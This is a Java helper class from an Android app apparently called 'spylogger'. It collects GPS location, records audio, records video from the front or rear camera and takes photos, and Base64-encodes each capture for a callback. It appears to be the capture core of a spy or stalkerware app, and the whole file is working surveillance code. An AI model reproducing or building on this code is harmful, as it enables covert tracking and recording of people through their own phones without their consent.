package com.gravatasufoca.spylogger.helpers;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.gravatasufoca.spylogger.services.GPSTracker;
import com.gravatasufoca.spylogger.utils.Utils;

import java.io.IOException;

/**
 * Created by bruno on 19/11/16.
 */

public class ServicosHelper {

    public void getLocation(Context context, final TaskComplete callback) {
        GPSTracker gpsTracker = new GPSTracker(context);
        if (gpsTracker.canGetLocation()) {
            try {
                Thread.sleep(5000);
                Log.i("GPS LOCATION", Double.toString(gpsTracker.getLatitude()) + "," + Double.toString(gpsTracker.getLongitude()));
                Log.i("GPS LOCATION", Double.toString(gpsTracker.getAccuracy()));
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public void getAudio(Context context, int maxLength, final TaskComplete callback) {
        try {
            final MediaRecorderHelper mediaRecorderHelper = new MediaRecorderHelper(context, MediaRecorderHelper.TipoRecordedMidia.AUDIO);
            TaskComplete cb = new TaskComplete() {
                @Override
                public void onFinish(Object object) {
                    if (object!=null && callback != null) {
                        callback.onFinish(Utils.encodeBase64(mediaRecorderHelper.getRecordedFile()));
                    }
                }
            };
            mediaRecorderHelper.setMaxDuration(maxLength);
            mediaRecorderHelper.setCallback(cb);
            mediaRecorderHelper.setLigacao(false);
            mediaRecorderHelper.start();

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void getVideo(final Context context, final int maxLength, final boolean frontCamera, final TaskComplete callback) {
        final Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    final MediaRecorderHelper mediaRecorderHelper = new MediaRecorderHelper(context, MediaRecorderHelper.TipoRecordedMidia.VIDEO);
                    TaskComplete cb = new TaskComplete() {
                        @Override
                        public void onFinish(Object object) {
                            if (callback != null && object!=null) {
                                callback.onFinish(Utils.encodeBase64(mediaRecorderHelper.getRecordedFile()));
                            }
                        }
                    };
                    mediaRecorderHelper.setMaxDuration(maxLength);
                    mediaRecorderHelper.setCallback(cb);
                    mediaRecorderHelper.setFrontCamera(frontCamera);
                    mediaRecorderHelper.start();

                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });

    }

    public void getPicture(final Context context, final boolean frontCamera, final TaskComplete callback) {
        final Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    final MediaRecorderHelper mediaRecorderHelper = new MediaRecorderHelper(context, MediaRecorderHelper.TipoRecordedMidia.IMAGE);
                    TaskComplete cb = new TaskComplete() {
                        @Override
                        public void onFinish(Object object) {
                            if(callback!=null && object!=null) {
                                byte[] data = (byte[]) object;
                                callback.onFinish(Utils.encodeBase64(data));
                            }
                        }
                    };
                    mediaRecorderHelper.setCallback(cb);
                    mediaRecorderHelper.setFrontCamera(frontCamera);
                    mediaRecorderHelper.takePicture();

                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
    }
}
